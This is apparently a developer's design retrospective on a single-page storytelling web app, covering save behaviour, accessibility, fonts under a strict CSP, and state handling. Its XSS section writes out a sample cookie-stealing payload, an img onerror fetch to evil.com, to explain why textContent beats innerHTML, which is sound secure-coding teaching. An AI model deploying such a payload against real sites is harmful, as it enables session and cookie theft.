# What I Learned: Full Story Builder

**Feature**: End-to-end Lean Storytelling Story Builder — all three waves (Basic, Detailed, Full), unified field template with foldable advice, real-time right-pane preview, story title widget, accessible progress bars, typography refresh.
**Generated**: 2026-03-26
**Scope**: Full feature
**Implementation status**: 49/52 tasks completed (T050–T052 are manual verification tasks)

---

## Key Decisions

### 1. Real-Time Save Over a Submit Button

**What we did**: Wired `input` and `change` events directly to `saveSession()` + `updateRightPane()` on every keystroke and status change. Removed the submit button, Edit button, Cancel button, and the enter/exit edit-mode flow entirely.

**Why**: The old v0.1 pattern treated the story like a form submission — you'd fill it out, then "submit" to see the result. But a story builder is a thinking tool, not a form. The split-screen layout only makes sense if the right pane is always alive. Removing the commit step also removes the mental overhead of "am I in edit mode right now?" — a question that adds cognitive friction at exactly the wrong moment.

**Alternatives considered**:
| Approach | Why it wasn't chosen |
|----------|---------------------|
| Debounced auto-save (e.g., save after 300ms idle) | Adds complexity with no real benefit — sessionStorage writes are synchronous and negligible at this scale (8 short text fields) |
| Keep Edit/Cancel buttons alongside live preview | Introduces conflicting mental models: "is the preview showing my draft or my saved state?" — confusing UX for no gain |
| Explicit save button (no cancel) | Still creates an artificial commit step that breaks the live preview experience |

**When you'd choose differently**: When the data goes to a backend and saves are expensive (network latency, server load), debouncing or an explicit save makes sense. Also when users need to discard changes — "cancel" is valuable when data is shared or has side effects outside the client.

---

### 2. Native `<details>`/`<summary>` Over a JS-Driven Toggle

**What we did**: Used HTML's native `<details>`/`<summary>` elements for all foldable advice sections. No JavaScript is involved in toggling them — the browser handles it natively via the `open` attribute.

**Why**: The platform already solves this problem correctly. Native `<details>` gives you keyboard accessibility (Enter/Space on `<summary>`), the `open` attribute for CSS state targeting (`details[open]`), and correct screen reader semantics — all for free. Writing a JS toggle means manually managing `aria-expanded`, focus handling, and open/close state. That's three things you can get wrong, for a feature the browser already implements.

**Alternatives considered**:
| Approach | Why it wasn't chosen |
|----------|---------------------|
| JS + `aria-expanded` toggle | Adds JS complexity and requires manual ARIA management — no benefit over `<details>` in this context |
| CSS-only checkbox hack (`<input type="checkbox">` + label) | Semantically wrong, harder to maintain, no native accessibility |

**When you'd choose differently**: When you need fine-grained animation control (e.g., animated height transition), native `<details>` is limited — the `open` attribute flips instantly with no intermediate state. CSS `grid-template-rows: 0fr → 1fr` transitions require a JS class toggle. Also when the disclosure widget needs to be controlled externally (e.g., "expand all" / "collapse all" buttons) — `<details>` can be manipulated via JS (`setAttribute('open', '')` / `removeAttribute('open')`), but it's slightly awkward.

---

### 3. Input-Toggle Pattern for Inline Title Editing

**What we did**: The story title displays as a styled `<h2>`. On click, JS hides the `<h2>` and reveals a matching `<input>` pre-filled with the current title. Enter or blur commits; Escape reverts. The value is always read via `.value` — never `.innerHTML`.

**Why**: Two common alternatives — `contenteditable` and a always-visible input — each have a specific flaw here. `contenteditable="plaintext-only"` has inconsistent paste behavior across browsers and invites `.innerHTML` reading (XSS surface). An always-visible input styled as a heading works but signals "this is an input" — it removes the distinction between reading and editing modes, which matters when the element is a prominent heading rather than a data field.

**Alternatives considered**:
| Approach | Why it wasn't chosen |
|----------|---------------------|
| `contenteditable="plaintext-only"` | Cross-browser paste inconsistency; easy to accidentally read `innerText` instead of `textContent` (XSS risk) |
| Always-visible `<input>` styled as heading | Less elegant — an input always looks interactive, which works against the "story title as identity" metaphor (Constitution Principle VI) |

**When you'd choose differently**: For dense data-entry interfaces (tables, lists of editable fields), always-visible inputs are appropriate — the interaction model is "you're here to edit." The display/edit toggle is worth the extra JS only when the element doubles as a polished presentation artifact. The story title is meant to feel like the cover of a document, not a form field.

---

### 4. Module-Level `_currentWave` Variable Over a Framework State Manager

**What we did**: Introduced a single module-level variable `_currentWave` (`'basic'` | `'detailed'` | `'full'`) managed by a `setWave(wave)` function that handles all DOM side effects in one place.

**Why**: Three discrete states, one active at a time — this is as simple as state management gets. A class-based state machine, a Redux-style store, or any reactive framework would add 100–300 lines of infrastructure to solve a problem that fits in 30 lines. The key insight is that `setWave()` already IS the state machine: it transitions to the new state and handles all consequences synchronously. There's no asynchronous state, no derived state, no subscribers — just "when wave changes, do these 7 things."

**Alternatives considered**:
| Approach | Why it wasn't chosen |
|----------|---------------------|
| URL hash routing (`#basic`, `#detailed`, `#full`) | Adds bookmarkability but also history entries on every wave switch — undesirable for a within-session scratch pad. Also complicates page load logic. |
| Class-based state machine (e.g., XState) | Significant dependency + conceptual overhead for 3 states with no guards, history, or parallel states |
| Reactive signals / observables | Useful when multiple independent components need to react to state — not the case here where `setWave()` is the single orchestrator |

**When you'd choose differently**: When state has multiple independent consumers that shouldn't need to know about each other (e.g., a header component, a sidebar, and a content area all reacting to auth state), a shared store or reactive signal is worth it. Also when state transitions have guards, are async, or need history — at that point a proper state machine pays for itself.

---

### 5. Self-Hosted Fonts Under a Strict Content Security Policy

**What we did**: Downloaded Playfair Display and DM Sans as `.woff2` files from the Google Fonts static export, placed them in `/fonts/`, declared them via `@font-face` in `style.css`, and added them to the service worker cache.

**Why**: The app enforces `Content-Security-Policy: default-src 'self'` — this blocks every external resource load, including Google Fonts CDN, with no visible error in the browser console (it just silently falls back to the system font). Self-hosting is the only compliant path. The font payload is ~83KB total (well under a 200KB budget), both fonts are OFL 1.1 (compatible with self-hosting), and adding them to the service worker means they're available offline — a requirement for a PWA.

**Alternatives considered**:
| Approach | Why it wasn't chosen |
|----------|---------------------|
| Google Fonts CDN | Blocked by CSP. Fonts silently fail to load — invisible breakage in production |
| System font stack | Can't guarantee Playfair Display on any platform; violates Constitution Principle VI (elegant typography) |
| Base64-inline in CSS | ~500KB per weight, dramatic CSS file bloat, unmaintainable |

**When you'd choose differently**: If CSP allows `font-src https://fonts.gstatic.com`, a CDN is simpler to maintain (no manual download/update cycle). But for any production app with a strict CSP — or one that must work offline — self-hosting is the correct default. The maintenance cost (updating font files when a new version is released) is low.

---

### 6. Wave-Contextual Preview: Show Only What the Active Wave Teaches

**What we did**: `updateRightPane()` has three rendering modes driven by `_currentWave`: Basic shows 3 fields, Detailed shows 6 (paired), Full shows all 8 in canonical delivery order. Fields from other waves are never shown regardless of whether they have content.

**Why**: The temptation is to always show all 8 fields in the right pane and let the user see their full story at all times. But this is a teaching app — the preview is part of the lesson. When the user is on the Detailed wave, showing the Detailed fields paired with their adjacent Basic fields teaches the structural relationship (Empathy enriches Target, Consequences deepen Problem). When the user is on Full, seeing all 8 in delivery order is the point. Showing everything always would collapse the progressive disclosure that mirrors the methodology's own structure.

**Alternatives considered**:
| Approach | Why it wasn't chosen |
|----------|---------------------|
| Always show all 8 fields (regardless of active wave) | Removes the progressive learning signal; clutters the preview with empty blocks before the user has reached those fields |
| Show only currently-active-wave fields (not carry-overs) | Loses context — seeing Empathy without Target nearby makes the pairing invisible |

**When you'd choose differently**: If the app were primarily a document editor rather than a teaching tool, showing the full story at all times would be right — you'd want to see the complete picture while editing any part of it. The wave-contextual view is a pedagogical choice that matches the Lean Storytelling methodology's own step-by-step progression.

---

### 7. WCAG Accessibility via Three Independent Channels (Not Just Color)

**What we did**: Each progress bar step indicator communicates its state through three simultaneous, redundant channels: shape (hollow vs. filled circle), emoji (🤔/🔄/✅/✓), and `aria-label` ("Target: filled, confirmed"). No state is conveyed by color alone.

**Why**: WCAG 2.1 Success Criterion 1.4.1 ("Use of Color") requires that color not be the sole means of conveying information. Color-blind users (roughly 8% of males) cannot distinguish red/green reliably. Screen reader users get no visual signal at all. The three-channel approach means each channel degrades gracefully: if color doesn't work, shape and emoji still convey state; if emojis don't render, shape + aria-label still work; if neither renders visually, the aria-label is the fallback.

**Alternatives considered**:
| Approach | Why it wasn't chosen |
|----------|---------------------|
| Color only (green = filled, gray = empty) | Fails WCAG 1.4.1; invisible to 8% of male users and all screen reader users |
| Text labels only ("3/3 filled") | Accessible but loses the per-field granularity and confidence status detail |
| Emoji only (no aria-label) | Emoji rendering is inconsistent across platforms; screen readers announce emoji names verbosely and inconsistently |

**When you'd choose differently**: For an internal tool where the user base is known and accessibility requirements are relaxed, color-only can be acceptable. For any public-facing product — or any product subject to WCAG compliance — multi-channel state communication is non-negotiable. It also tends to make the UI clearer for everyone, not just users with disabilities.

---

## Concepts to Know

### Progressive Disclosure

**What it is**: A UX pattern where information is hidden by default and revealed on demand. The goal is to reduce initial cognitive load — show only what the user needs right now, and let them opt into more detail. The classic implementation is an accordion or disclosure widget.

**Where we used it**: Every field's advice section (`<details>`/`<summary>`). The advice is collapsed by default across all three wave forms. The user expands it when they want coaching on a specific field. The advice also resets to collapsed on every wave switch — a deliberate choice to keep each wave feeling fresh rather than visually noisy.

**Why it matters**: Without progressive disclosure, the form would show ~800 words of static coaching text alongside every field — a wall of text that obscures the actual input areas. The collapsible advice turns the form from a reference document into a focused writing environment with optional guidance.

---

### Content Security Policy (CSP)

**What it is**: An HTTP header that restricts what resources a page can load and from where. `default-src 'self'` means "only load resources from this exact origin — no external scripts, styles, fonts, images, or API calls." It's one of the strongest defenses against XSS and data exfiltration attacks.

**Where we used it**: The app has a strict CSP that forced self-hosting all fonts (R-001 in research.md). Any `<script src="...">`, `<link href="...">` or CSS `url(...)` pointing to an external domain silently fails — including Google Fonts CDN.

**Why it matters**: CSP mismatches are invisible failures — a missing font just falls back to the system default, with no console error if the CSP blocks it. Understanding CSP early means you check it before adding any external resource, not after puzzling over why your fonts aren't loading in production.

---

### XSS Prevention: textContent vs innerHTML

**What it is**: Cross-Site Scripting (XSS) occurs when user-supplied content is inserted into the DOM as HTML. `element.innerHTML = userText` interprets the string as HTML — if `userText` contains `<script>alert(1)</script>`, it executes. `element.textContent = userText` inserts the string as literal text — tags are escaped automatically.

**Where we used it**: Every place user content appears in the DOM: right-pane preview blocks (story field content), the story title display, and progress bar `aria-label` updates. The rule is absolute: user content goes in via `.textContent`, hardcoded content (emoji constants, UI labels) can use `.textContent` too — there's no reason to ever use `innerHTML` for user-supplied data.

**Why it matters**: A story field could contain `<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">`. With `innerHTML`, that executes. With `textContent`, it displays literally as the string the user typed. The CSP would catch most of these attacks anyway — but defense in depth means you don't rely on a single layer.

---

### Session Storage as a Feature Boundary

**What it is**: `sessionStorage` is a browser API that persists data for the lifetime of a browser tab. Unlike `localStorage` (which persists until cleared), sessionStorage is discarded when the tab closes. Each tab gets its own independent sessionStorage — multiple tabs can run the app simultaneously without interfering.

**Where we used it**: All story content (8 fields + 8 statuses + storyTitle) is stored in sessionStorage on every `input` or `change` event. An in-memory object serves as fallback if sessionStorage is unavailable (private browsing restrictions in some browsers).

**Why it matters**: The choice of sessionStorage over localStorage is a product decision: the app is a scratch pad for building a story, not a long-term document editor. Session-scoped persistence keeps the data model simple (no "clear my story" or "new story" feature needed — close the tab) while still surviving accidental refreshes within a working session.

---

### Module Scope as Lightweight State

**What it is**: In a plain JavaScript module (`<script type="module">`), variables declared at the top level are scoped to that module — they persist for the lifetime of the page, are accessible to all functions within the module, but are not accessible to external code. This makes them a lightweight alternative to a global variable or a state management library.

**Where we used it**: `_currentWave` in `app.js` — prefixed with `_` by convention to signal "internal, don't touch from outside." The underscore prefix is a team convention, not enforced by the language.

**Why it matters**: For a small, self-contained application, module-level variables are the right tool. They avoid the complexity of a state management library (Redux, Zustand, MobX) while keeping state out of the global scope (where it could be accidentally modified or create naming collisions). The rule of thumb: use module scope until you have multiple modules that genuinely need to share the same state.

---

## Architecture Overview

The app is a single-page, single-file-per-concern application: `index.html` owns structure, `style.css` owns presentation, `app.js` owns behavior. The wave router (`setWave()`) is the central orchestrator — it's the only function that changes which form section is visible, and calling it always leaves the DOM in a consistent state (active card highlighted, advice collapsed, form populated, preview updated, progress bars updated). Data flows in one direction: DOM input events → `saveSession()` → sessionStorage → `updateRightPane()` / `updateWaveProgress()` → DOM output. There is no bidirectional binding, no reactive framework, no component tree. What exists is exactly as complex as it needs to be.

```
User input
    │
    ▼
[textarea input / select change]
    │
    ├──► saveSession()  ──► sessionStorage
    │
    ├──► updateRightPane()  ──► #preview-* DOM blocks
    │
    └──► updateWaveProgress()  ──► .wave-step DOM spans

Wave card click
    │
    ▼
setWave(wave)
    ├── show/hide #basic-form / #detailed-form / #full-form
    ├── toggle .wave-card--active
    ├── collapse all <details>
    ├── populateForm(story)
    ├── updateRightPane()
    └── updateWaveProgress()
```

---

## Glossary

| Term | Meaning |
|------|---------|
| Wave | One of three progressive story-building stages: Basic (3 fields), Detailed (3 fields), Full (2 fields). Each wave has its own form section and progress bar. |
| Canonical delivery order | The fixed presentation sequence for a complete story: Context → Target → Empathy → Problem → Consequences → Solution → Benefits → Why. Defined by the Lean Storytelling playbook; never configurable. |
| `setWave()` | The wave router function in `app.js`. The only function that changes `_currentWave`. It handles all 7 DOM side effects synchronously. |
| `*Status` field | The confidence status paired with each content field. Values: `null`, `'unsure'`, `'needs-review'`, `'confirmed'`. Automatically set to `null` when its paired content field is empty. |
| OFL 1.1 | SIL Open Font License 1.1 — permits use, modification, and redistribution of fonts, including embedding and self-hosting. Both Playfair Display and DM Sans use this license. |
| WCAG 2.1 AA | Web Content Accessibility Guidelines 2.1, Level AA — the standard compliance target for professional web applications. Key for this feature: 1.4.1 (no color-alone state), 1.4.3 (contrast ≥4.5:1 for text). |
